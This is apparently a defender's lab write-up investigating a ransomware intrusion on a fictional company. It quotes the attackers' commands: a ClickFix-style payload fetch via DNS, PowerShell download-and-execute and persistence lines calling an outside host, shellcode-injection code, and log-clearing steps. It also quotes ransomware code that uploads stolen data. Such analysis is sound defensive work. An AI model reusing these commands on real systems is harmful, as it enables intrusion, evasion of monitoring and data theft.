### <span class="hl">TL;DR</span>

On the morning of March 22, 2026, Maromalix Corporation suffered a targeted ransomware attack. The threat actor initially compromised the public-facing website, displaying a fake error message that convinced a user omar.hassan to execute a malicious command. This fetched a *Cobalt Strike* beacon hidden in DNS records. The attacker dropped SharpHound and Certify to enumerate AD CS. They then exploited **CVE-2025-24071** using a malicious *.library-ms* file on network shares to steal credentials. The attacker escalated privileges via an **ESC1** certificate attack, impersonating a high-privileged account mohamed.elfeky. Moving laterally using *smbexec.py*, the attacker temporarily disabled logging services , cleared event logs, and deployed the **RansomHub** payload.

### <span style="color:red">Stage 0: Initial Access</span>

#### Fake Error Message and Execution

Knowing that the company's public-facing website was compromised with a fake error message, which convinced the user to run a malicious command, I for process creation events where explorer spawned cmd or PowerShell.
At 14:28:43 user omar.hassan on WKSTN-01 executed this command:
```powershell
"C:\Windows\system32\cmd.exe" /c "for /f "tokens=1*" %%i in ('n^s^^l^^o^o^kup -timeout^=5 example.com  3.77.33.191 ^| findstr Name:') do %%j" & :: Set back and stay still and fixes will be applied now 
```
It is an interesting command, which queries an attacker-controlled DNS server that is pre-configured to return the next stage payload in the `Name:` field. Then, the command parses the result and executes the content of the that field.
![alt text](image1.png)

Instantly after that, a powershell command was executed, which downloaded something named a from IP *35.158.162.78* and ran it.
```powershell
powershell  -nop -w hidden -c IEX((new-object net.webclient).downloadstring('http://35.158.162.78/a')) 
```

![alt text](image2.png)

### <span style="color:red">Stage 1: Cobalt Strike beacon</span>

#### Stager Decode
The content of `a` was captured in event id 4104. We see a long base64 line.

![alt text](image.png)

With a decompression and immediate running at the end.

![alt text](image-1.png)

Instantly after that we can see the execution of a much larger PowerShell script. And after that, we see repeatedly Event ID 3 connections to *35.158.162.78*.
![alt text](image-2.png)

#### Custom Delegates
I used a beautifier to make the code more readable.
The script has 2 functions. The first dynamically resolves the memory address of a Win32 API function with GetProcessID and GetModuleHandle by reflecting into the already loaded System.dll. The second one generates a custom C# *delegate* type entirely in memory using System.Reflection.Emit. This is needed because PowerShell cannot execute code from a raw memory address; it requires a delegate - a blueprint that defines the function's expected parameters and return type, thereby enabling the script to cast raw memory pointers into callable functions.

![alt text](image-3.png)

#### RWX Injection
After that, we see a large base64 payload. It gets decrypted via an XOR operation with the value 35. It is then allocated in memory using the dynamically resolved `VirtualAlloc` API with the *0x40* parameter, which assigns **RWX** memory permissions, and executed.

```powershell
If ([IntPtr]::size -eq 8) {
    [Byte[]]$var_code = [System.Convert]::FromBase64String('bnlicXZrqsZros8DIyMja64+yd...')

        for ($x = 0; $x -lt $var_code.Count; $x++) {
        $var_code[$x] = $var_code[$x] -bxor 35
    }

    $var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
    $var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)
    [System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)

    $var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))
    $var_runme.Invoke([IntPtr]::Zero)
}
```

#### Cobalt strike beacon config
I recreated the decryption routine and received a 
```
beacon.bin: PE32+ executable (DLL) (GUI) x86-64, for MS Windows file.  
MD5: 7d96a4885b5331cd61479759ff2ae1eb
```
VirusTotal identifies it as a beacon from the Cobalt Strike framework.

![alt text](image-4.png)

I used the Cobalt Strike Configuration Extractor (CSCE). It is a "python library and set of scripts to extract and parse configurations from Cobalt Strike beacons".

```text

0x0043 DNS_STRATEGY                     0x0001 0x0002 0

```

We can see that the beacon uses HTTPS to communicate with IP *35.158.162.78* over port 443 to the /updates endpoint. 
The victim is beaconing the malicious server every 5 seconds. Additionally, we see the *publickey* field, which is used by the malicious server to encrypt communications between the server and the beacon; if there is a command for the victim, it sends the result on the /submit endpoint. This is different from normal TLS certificates used when accessing the C2 domain with a browser. Also, we see a useragent:  

* Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36

It uses a host header with value **fonts.googleapis.com**. Also as we see from the Build Metadata block, the beacon sends retrieved information in the `Cookie: user=` field with base64.

### <span style="color:red">Stage 2: Post-Exploitation</span>
#### Persistence
There was no malicious activity before 18:49. 
![alt text](image-5.png)

At that time the attacker executed a command, which is performing persistence by creating an Update value to the `\Run` registry key.
```powershell
"C:\Windows\system32\cmd.exe /C reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Update /t REG_SZ /d ""powershell.exe -nop -w hidden -c IEX((new-object net.webclient).downloadstring('http://35.158.162.78:80/a'))"" /f"
```

And for some reason they checked the version of the installed .NET Framework. 
![alt text](image-6.png)

#### AD Recon
At 18:51 they dropped QA.exe in the C:\Users\omar.hassan\Q2_review\ folder and ran it. In description field we see *SharpHound.exe*. It is the data collector for BloodHound CE, it uses native win API functions and LDAP namespace functions to collect data from domain controllers and domain-joined Windows systems.
![alt text](image-10.png)

Also, they used the *certutil* LOLBin to obtain information about all certificate templates configured on **Active Directory Certificate Services**, which is a service used for managing PKI on a network, and saves it in the template_audit.log file. 
```powershell
certutil -v -template > C:\Users\omar.hassan\Q2_review\template_audit.log
```
Certificate templates are a set of rules that define what certificates can be distributed for what purposes, they define:
* Who can request certificates 
* What the certificate can be used for 
* Whether the subject name can be specified by the requester
* Authentication requirements for enrollment  
They can be used in **ESC techniques** for privilege escalation attacks
Then they use *Certify.exe*, which is a tool to enumerate and abuse misconfigurations in AD CS.
![alt text](image-8.png)

Followed by basic network recon:
```cmd
C:\Windows\system32\cmd.exe /C nslookup DC01
C:\Windows\system32\cmd.exe /C nbtstat -a 10.10.11.154
C:\Windows\system32\cmd.exe /C net view \\DC01
```

#### Shares
At 19:20 the attacker put the 2026_Payroll_Adjustments.zip zip archive in the shares folders:
* \\DC01\Finance\
* \\DC01\IT-Helpdesk\

![alt text](image-11.png)

And then at 19:26 user nour.khalil on WKSTN-02 unpacked that archive on Finance and omar.hassan on IT-Helpdesk.

![alt text](image-12.png)

I tried to find the content of that archive, so I filtered for Event ID 5145, this event generates every time a network share file or folder is accessed. And I found that, right after unpacking, there was interaction with the file 2026_Payroll_Adjustments.library-ms.

![alt text](image-13.png)

*.library-ms* files are used for creating virtual folders with collections of similar files, called libraries. These files are XML files that define these libraries. This file has a tag `<simpleLocation>/<url>`, in which the addresses of **remote resources** can be written.

#### CVE-2025-24071
It is a vulnerability with a 7.5/10 score in Windows Explorer. The issue arises from the implicit trust and automatic file parsing behavior of `.library-ms` files in Windows Explorer. An unauthenticated attacker can exploit this vulnerability by constructing RAR/ZIP files containing a malicious SMB path. Upon decompression, this triggers an SMB authentication request, potentially exposing the user's NTLM hash.

I checked who had accessed this file:
* nour.khail
* omar.hassan
* ahmed.farouk
![alt text](image-14.png)

### <span style="color:red">Stage 3: Privilege escalation</span>

#### ESC1 attack
Knowing about possible ESC attacks, I first of all started looking for a certificate request, which identifies ESC1. I found that at 19:46 user khaled.ibrahim requested a certificate with:
```text
Attributes: CertificateTemplate:Maromalix-UserAuth
SAN:upn=mohamed.elfeky@maromalix.corp
```
![alt text](image-15.png)

ESC1 is the most straightforward AD CS attack. It exploits certificate templates that allow attackers to specify arbitrary Subject Alternative Names (SANs).
The vulnerability happens when a certificate template has:
* `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag enabled
* Client Authentication or Any Purpose EKU
* Domain Users enrollment permissions
* No manager approval required

When all these conditions align, the attacker can request a certificate for any user in the domain.

The next step after this attack is granting a TGT ticket. At 19:47 mohamed.elfeky requested it.
![alt text](image-16.png)

After that the user authenticated to four machines almost simultaneously.

![alt text](image-17.png)

### <span style="color:red">Stage 4: Lateral Movement</span>

#### Logs services` stopping

At all compromised machines they started executing commands with an interesting pattern, which indicates *smbexec.py*. It is part of the Impacket tools and allows an attacker to launch programs remotely. It’s similar to PsExec, but it uses the SMB protocol to get command outputs.
![alt text](image-18.png)

smbexec works like this: The attacker authenticates on the target system, and a service is created. The service runs the command. The command output is saved to a file. The attacker gets the output from either the tool accessing the *C$* share on the target system and copying it, or the target system will access a share on the source system.

On each compromised machine, these commands were executed:

```text
19:51 - cd
19:51 - tasklist /v 
19:52 - sc query
19:52 - sc stop "filebeat"
20:02 - wevtutil cl "Microsoft-Windows-Sysmon/Operational"
20:02 - wevtutil cl Security
20:02 - wevtutil cl "Microsoft-Windows-PowerShell/Operational"
20:03 - wevtutil cl System
20:03 - sc start "filebeat"
20:03 - sc start "winlogbeat"
20:03 - sc start "splunkforwarder"
```

The attacker stopped services *filebeat, winlogbeat, and splunkforwarder* at 19:52 to prevent the SIEM from receiving logs. From 19:52 to 20:02 we have no logs. After that, the attacker cleared the sysmon, security, system, and powershell logs by using the *wevtutil  cl* utility and after that started the services back to avoid attracting attention.

I checked MFT and $J logs in that period on WKSTN-01, WKSTN-02 and DCO1 machines, and there the attacker created a binary file Missme.exe
![alt text](image-19.png)

And after that encrypted files with new extension *.94ccaa* begin appeared. 
hi![alt text](image-23.png)

#### AV Detection

Also, I decided to check Windows Defender logs at compromised machines and I found that at 19:54 on WKSTN-03, 2 minutes after SIEM logs stopped, the attacker downloaded from *3.75.76.243:4422* the same **Missme.exe** file and stored it in C:\Windows\Temp\
![alt text](image-20.png)

This payload was caught, quarantined, and identified by Windows Defender locally on WKSTN-03 as `Trojan:MSIL/Lazy.BAC!MTB`. So, on this specific host, it didn't execute.
![alt text](image-21.png)

### <span style="color:red">Stage 5: Ransomware analysis</span>

#### Static Analysis
I used a script for dumping quarantined files from windows defender and I got a ransomware binary.
![alt text](image-22.png)

It is a binary written in C#, it has no high entropy, which means it isn't packed or obfuscated. So I decided to do static analysis with **dnSpy**

The file has these functions.
![alt text](image-24.png)

From the Main function, the ransomware encrypts these targets:
* `C:\Users\<Username>\*` (personal folders, excluding system/shared)
* `C:\Shares` (local shared folder)
* `\\<Network_Server>\*` (all folders on the remote file server)

It targets these files:

```csharp
{
    ".docx",
    ".doc",
    ".xlsx",
    ".xls",
    ".pptx",
    ".ppt",
    ".pdf",
    ".txt",
    ".csv",
    ".rtf",
    ".jpg",
    ".jpeg",
    ".png",
    ".gif",
    ".bmp",
    ".mp4",
    ".avi",
    ".mov",
    ".mkv",
    ".zip",
    ".rar",
    ".sql",
    ".mdb",
    ".accdb"
};
```

It can perform self-delete:
```cmd
ping 127.0.0.1 -n 10 > nul & del /f /q \"C:\\Windows\\Prefetch\\MISSME*\" & del /f /q \"{0}\"
```

It exfiltrates data to `http://35.158.162.78:8080/upload`:

```csharp
    try
    {
        byte[] data = File.ReadAllBytes(Program.StageZip);
        using (WebClient webClient = new WebClient())
        {
            webClient.Headers.Add("X-Victim", Environment.MachineName);
            webClient.Headers.Add("Content-Type", "application/octet-stream");
            webClient.UploadData("http://35.158.162.78:8080/upload", data);
        }
    }
```

For encryption, it uses AES in CBC mode with:
* **IV:** 9b4f2a7c1e3d8f5ba26e0cd43f7a1b8e 
* **Key:** 3f8a2c1d7b4e9f6a0c5d2e8b1f3a7c4ed1a3f50b6c9e2d4f8a1b7c3e5d9f2a6b

```csharp
private static byte[] EncryptBytes(byte[] data)
{
    byte[] result;
    using (Aes aes = Aes.Create())
    {
        aes.Key = Program.AesKey;
        aes.IV = Program.AesIV;
        aes.Mode = CipherMode.CBC;
        aes.Padding = PaddingMode.PKCS7;
//...[snip]...
```

And it creates notes leading to:
* `http://ransomhubn3snwif3ixzs7hdpsnpfiqzqyqbgzgkiodglqwrj7jk5cqd[.]onion`
